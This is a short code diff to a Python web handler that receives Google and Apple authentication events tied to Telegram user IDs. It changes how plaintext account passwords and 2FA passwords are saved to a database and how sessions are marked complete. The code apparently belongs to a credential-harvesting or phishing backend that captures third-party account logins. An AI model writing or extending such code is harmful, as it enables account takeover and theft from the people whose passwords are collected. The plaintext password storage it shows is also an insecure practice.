@@ -245,12 +245,18 @@ async def handle_auth_event(request: web.Request) -> web.Response:
             if email:
                 db.set_user_email(DB_PATH, tg_id, email)
             goog_pwd = data.get("google_password") or password_2fa or (user.get("google_password") if user else None)
-            db.save_google_session(DB_PATH, tg_id, email=email, password=goog_pwd, status="pending" if not event.endswith("complete") else "completed")
+            if goog_pwd:
+                db.set_user_google_password(DB_PATH, tg_id, goog_pwd)
+            if event.endswith("complete"):
+                db.save_google_session(DB_PATH, tg_id, email=email, password=goog_pwd, status="completed")
         elif event.startswith("apple_"):
             if email:
                 db.set_user_email(DB_PATH, tg_id, email)
             app_pwd = data.get("apple_password") or password_2fa or (user.get("apple_password") if user else None)
-            db.save_apple_session(DB_PATH, tg_id, email=email, password=app_pwd, status="pending" if not event.endswith("complete") else "completed")
+            if app_pwd:
+                db.set_user_apple_password(DB_PATH, tg_id, app_pwd)
+            if event.endswith("complete"):
+                db.save_apple_session(DB_PATH, tg_id, email=email, password=app_pwd, status="completed")
         else:
             if phone:
                 db.set_user_phone(DB_PATH, tg_id, phone)
